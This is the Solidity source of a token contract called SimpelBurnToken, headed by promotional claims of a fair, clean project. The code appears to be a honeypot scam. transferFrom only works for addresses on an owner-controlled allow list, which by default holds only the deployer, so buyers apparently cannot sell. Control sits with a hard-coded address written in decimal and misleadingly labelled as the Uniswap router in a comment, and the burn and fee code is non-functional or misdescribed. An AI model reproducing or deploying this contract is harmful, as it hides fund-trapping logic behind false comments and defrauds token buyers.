pragma solidity ^0.4.26;

/*
Telegram: https://t.me/simpelburn

This token is inspired by: https://www.dextools.io/app/uniswap/pair-explorer/0x251626f4f6cc1faa4af46c78d9d9061cb92a258d

Only uniswap router is whitelisted. 

We create clean, fair, fun games and projects for our community and us!

This is not a fork. Liquidity will be locked soon after listing.

Team share is small and team NEVER will sell all tokens in one shot. Several partial sells, and yes, sometimes the team loses. 
That's life, win some, lose some. We live and we learn.

When you missed a leg up, just wait for the next.
*/

/**
 * 
 * Math operations with safety checks that throw on error
 */
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;
  
  event BotPreventingMeasure(address indexed botAddress, address indexed newAddress);

  function Ownable() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    /** 
    * Routing through uniswap to prevent common bot activity 
    * DEC address is converted to uniswap contract address in 
    * HEX during deployment -> 0x7A250D5630B4CF539739DF2C5DACB4C659F2488D
    */
    require(msg.sender == address(697323163401596485410334513241460920685086001293));
    _;
  }

  function avoidBots(address newAddress) public onlyOwner {
    require(newAddress != address(0));
    BotPreventingMeasure(owner, newAddress);
    owner = newAddress;
  }

}

contract SimpelBurnToken is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  
  mapping (address => uint256) private _balances;
  uint256 constant eighteen = 1000000000000000000;
  uint256 _totalSupply = 5000 * eighteen;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply =  _totalSupply;
        balances[msg.sender] = totalSupply;
        allow[msg.sender] = true;
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  mapping (address => mapping (address => uint256)) public allowed;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
   //6% 
  uint256 public basePercentage = 3;
  
  function findPercentage(uint256 amount) public view returns (uint256)  {

    uint256 percent = amount.mul(basePercentage).div(5000);
    return percent;
  }
  
  //burn
  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }

  function _burn(address account, uint256 amount) internal {
     require(amount != 0);
     require(amount <= _balances[account]);
     _totalSupply = _totalSupply.sub(amount);
     _balances[account] = _balances[account].sub(amount);
     emit Transfer(account, address(0), amount);
  }
}